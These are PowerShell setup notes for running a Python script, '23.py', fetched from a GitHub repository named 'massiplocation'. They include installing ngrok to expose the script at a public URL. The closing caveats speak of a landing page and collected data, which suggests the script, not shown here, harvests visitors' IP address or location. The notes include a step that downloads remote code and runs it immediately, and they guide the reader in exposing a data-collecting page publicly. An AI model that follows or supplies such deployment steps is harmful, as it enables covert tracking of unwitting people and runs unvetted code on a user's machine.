Requirements Check
Make sure you have these installed first:

powershell
# Check if Python is installed
python --version

# If not, install Python
winget install Python.Python.3.12

# Install required dependencies
pip install requests





Install Python 3 (if not already installed):

# Check if Python is installed
python --version

# If not installed, download from python.org or use:
winget install Python.Python.3.12


Install ngrok (for public URL - optional):

# Download ngrok
Invoke-WebRequest -Uri "https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-windows-amd64.zip" -OutFile "ngrok.zip"
Expand-Archive -Path "ngrok.zip" -DestinationPath "C:\ngrok"
# Add to PATH or run from that directory



*Running the Script*


# Navigate to where you saved the file
cd C:\path\to\script

# Run the script
python 23.py


# Download the file
Invoke-WebRequest -Uri "https://raw.githubusercontent.com/aswinxks/massiplocation/refs/heads/main/23.py" -OutFile "23.py"

# Run it
python 23.py


To Use This Legally for Testing:


# 1. ONLY run on localhost (not ngrok)
# 2. ONLY test with your own devices
# 3. Modify the landing page to CLEARLY state it's a test
# 4. Add a consent checkbox before collecting ANY data
# 5. Delete all collected data immediately after testing
